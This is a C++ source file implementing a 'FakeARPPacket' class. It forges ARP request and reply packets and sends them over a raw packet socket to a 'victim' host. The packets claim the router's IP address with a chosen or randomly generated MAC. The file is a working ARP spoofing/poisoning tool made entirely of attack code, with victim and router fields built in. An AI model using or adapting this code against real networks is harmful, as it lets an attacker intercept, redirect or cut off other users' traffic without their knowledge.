/*
 * (c) 2018 syscl (aka Yating Zhou)
 */
#include "FakeARPPacket.h"

uint8_t* FakeARPPacket::genFakeMACAddr() const
{
	uint8_t* mac = static_cast<uint8_t*>(calloc(kMACAddrSize, sizeof(uint8_t)));
	if (nullptr == mac) {
		DBGF("%s(): Error allocating memory\n", __func__);
		return nullptr;
	}
    for (uint8_t* p = mac; p < mac + kMACAddrSize; p++) 
        *p = random() % 256; 
    DBG("MAC: %.2X:%.2X:%.2X:%.2X:%.2X:%.2X\n", mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
    return mac;
}

int FakeARPPacket::getInterfaceNo(char *const if_name) const
{
	DBGF("%s() ===>\n", __func__);
	struct ifreq ifr;
	// find interface length
	size_t if_name_len = strlen(if_name);
	// Check of the namesize fits in the structure
	if (if_name_len < sizeof(ifr.ifr_name)) {
	    memcpy(ifr.ifr_name, if_name, if_name_len);
	    ifr.ifr_name[if_name_len] = 0;
	} else {
	    DBG("Interface name %s is too long\n", if_name);
	    exit(EXIT_FAILURE);
	}
	
	// Open a dummy socket
	int fd = socket(AF_UNIX,SOCK_DGRAM,0);
	if (-1 == fd) {
		DBGF("%s(): error in socket\n", __func__);
	    exit(0);
	}
	
	if (ioctl(fd,SIOCGIFINDEX,&ifr) == -1) {
	    DBGF("%s(): error in ioctl\n", __func__);
	    exit(0);
	}
	
	DBGF("%s() <===\n", __func__);
	return ifr.ifr_ifindex;
}

void FakeARPPacket::setEthIF()
{
	DBGF("%s() ===>\n", __func__);
	struct ifaddrs *ifaddr;
	struct ifaddrs *ifa;
    int family;

    if (getifaddrs(&ifaddr) == -1) {
        perror("getifaddrs");
        exit(EXIT_FAILURE);
    }

    /* Walk through linked list, maintaining head pointer so we
              can free list later */
    for (ifa = ifaddr; ifa != nullptr; ifa = ifa->ifa_next) {
        if (ifa->ifa_addr == nullptr)
            continue;

    	family = ifa->ifa_addr->sa_family;

    	/* Display interface name and family (including symbolic
                	form of the latter for the common families) */
		if (family == AF_INET) {
			char *ifname = ifa->ifa_name;
			if (strstr(ifname, "-eth") && strstr(ifname, "h")) {
				cout << "Ethernet interface: " << ifname << endl;
				interfaceNo = getInterfaceNo(ifname); 
			}
		}
    }

    freeifaddrs(ifaddr);
	DBGF("%s() <===\n", __func__);
}

void FakeARPPacket::sendRequestPkt() const 
{
	DBGF("%s() ===>\n", __func__);
	if (genAndSendPkt(ARP_REQUEST)) {
		DBG("Send ARP request packet - OK\n");
	} else {
		DBG("Send ARP request packet - FAIL\n");
	}
	DBGF("%s() <===\n", __func__);
}

void FakeARPPacket::sendReplyPkt() const
{
	DBGF("%s() ===>\n", __func__);
	if (genAndSendPkt(ARP_REPLY)) {
		DBG("Send ARP reply packet - OK\n");
	} else {
		DBG("Send ARP reply packet - FAIL\n");
	}
	DBGF("%s() <===\n", __func__);
}

bool FakeARPPacket::genAndSendPkt(int type) const
{
	DBGF("%s() ===>\n", __func__);
	int fd = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
	if (-1 == fd) {
		perror("Error opening ARP socket\n");
		return false;
	}
	arp_t arp;
	memcpy(arp.victimMAC, victimMAC, kMACAddrSize);
	memcpy(arp.routerMAC, routerMAC, kMACAddrSize);
	arp.etype = htons(ARP_TYPE);
	arp.htype = htons(1);
	arp.ptype = htons(0x800);
	arp.hlen = 6;
	arp.plen = 4;
	arp.opcode = htons(type);
	memcpy(arp.sender_mac, routerMAC, kMACAddrSize);
	switch (type) {
		case ARP_REQUEST: {
			memcpy(arp.target_mac, routerMAC, kMACAddrSize);
			break;
		}
		case ARP_REPLY: {
			memcpy(arp.target_mac, victimMAC, kMACAddrSize);
			break;
		}
		default: {
			memcpy(arp.target_mac, routerMAC, kMACAddrSize);
			break;
		}
	}
	inet_pton(AF_INET, routerIP, arp.sender_ip);
	inet_pton(AF_INET, victimIP, arp.target_ip);

	// Create a target socket address structure
	struct sockaddr_ll socket_address;
	socket_address.sll_family   = PF_PACKET;	
	socket_address.sll_protocol = htons(ETH_P_ARP);	
	socket_address.sll_ifindex  = interfaceNo;
	socket_address.sll_hatype   = ARPHRD_ETHER;
	socket_address.sll_pkttype  = PACKET_OTHERHOST;
	socket_address.sll_halen    = ETH_ALEN;		
	memcpy(socket_address.sll_addr, victimMAC, kMACAddrSize);
	if (sendto(fd, &arp, sizeof(arp_t), 0, (struct sockaddr*)&socket_address, sizeof(socket_address)) < 0) {
		perror("Error sending\n");
		return false;
	}
	DBGF("%s() <===\n", __func__);
	return true;
}

void FakeARPPacket::setInterfaceNo(char* ifName)
{
	getInterfaceNo(ifName);
}

void FakeARPPacket::setRouterMAC(uint8_t* mac)
{
	DBGF("%s() ===>\n", __func__);
	memcpy(routerMAC, mac, kMACAddrSize);
	DBG("MAC: %.2X:%.2X:%.2X:%.2X:%.2X:%.2X\n", routerMAC[0], routerMAC[1], routerMAC[2], routerMAC[3], routerMAC[4], routerMAC[5]);
	DBGF("%s() <===\n", __func__);
}

void FakeARPPacket::setVictimMAC(uint8_t* mac)
{
	DBGF("%s() ===>\n", __func__);
	memcpy(victimMAC, mac, kMACAddrSize);
	DBG("MAC: %.2X:%.2X:%.2X:%.2X:%.2X:%.2X\n", victimMAC[0], victimMAC[1], victimMAC[2], victimMAC[3], victimMAC[4], victimMAC[5]);
	DBGF("%s() <===\n", __func__);
}

void FakeARPPacket::setRouterIP(char *ip)
{
	DBGF("%s() ===>\n", __func__);
	memcpy(routerIP, ip, kIPv4Size);
	DBG("IP: %d.%d.%d.%d\n", routerIP[0], routerIP[1], routerIP[2], routerIP[3]);
	DBGF("%s() <===\n", __func__);
}

void FakeARPPacket::setVictimIP(char* ip)
{
	DBGF("%s() ===>\n", __func__);
	memcpy(victimIP, ip, kIPv4Size);
	DBG("IP: %d.%d.%d.%d\n", victimIP[0], victimIP[1], victimIP[2], victimIP[3]);
	DBGF("%s() <===\n", __func__);
}

template<class T> T* FakeARPPacket::getMember(T *const aMember, const int size) const
{
	T* ret = reinterpret_cast<T*>(calloc(size, sizeof(T)));
	if (nullptr == ret) {
		DBGF("%s(): Error allocating memory\n", __func__);
		return nullptr;
	}
	memcpy(ret, aMember, size);
	return ret;
}

char* FakeARPPacket::getRouterIP() const
{
	return getMember<char>(routerIP, kIPv4Size);
}

char* FakeARPPacket::getVictimIP() const
{
	return getMember<char>(victimIP, kIPv4Size);
}

uint8_t* FakeARPPacket::getRouterMAC() const
{
	// we have to use const_cast for uint8_t[] to uint8_t* 
	// otherwise compile error
	return getMember<uint8_t>(const_cast<uint8_t*>(routerMAC), kMACAddrSize);
}

uint8_t* FakeARPPacket::getVictimMAC() const
{
	// we have to use const_cast for uint8_t[] to uint8_t* 
	// otherwise compile error
	return getMember<uint8_t>(const_cast<uint8_t*>(victimMAC), kMACAddrSize);
}
